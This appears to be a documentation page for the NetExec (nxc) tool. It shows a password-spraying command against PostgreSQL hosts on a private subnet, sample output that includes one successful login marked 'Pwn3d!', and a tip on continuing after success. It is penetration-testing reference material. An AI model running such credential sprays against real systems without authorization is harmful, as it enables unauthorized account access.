# Password spraying

## Password spraying (without bruteforce)

```bash
nxc psql 10.10.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

## Expected Results:

```bash
PSQL        10.10.1.10    5432   10.10.1.10     [*] PostgreSQL (version < 18) (TLS-supported:False)
PSQL        10.10.1.10    5432   10.10.1.10     [-] admin:password connection failed: connection to server at "10.10.1.10", port 5432 failed: FATAL:  password authentication failed for user "admin"
PSQL        10.10.1.10    5432   10.10.1.10     [-] app_admin:test1234 connection failed: connection to server at "10.10.1.10", port 5432 failed: FATAL:  password authentication failed for user "app_admin"
PSQL        10.10.1.10    5432   10.10.1.10     [-] admin2:postgres connection failed: connection to server at "10.10.1.10", port 5432 failed: FATAL:  password authentication failed for user "admin2"
PSQL        10.10.1.10    5432   10.10.1.10     [-] user1:PassWord1 connection failed: connection to server at "10.10.1.10", port 5432 failed: FATAL:  password authentication failed for user "user1"
PSQL        10.10.1.10    5432   10.10.1.10     [+] postgres:PgPass! (Pwn3d!) PostgreSQL 16.15 (Debian 16.15-1.pgdg13+2)
```

{% hint style="info" %}
By default, nxc will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.
{% endhint %}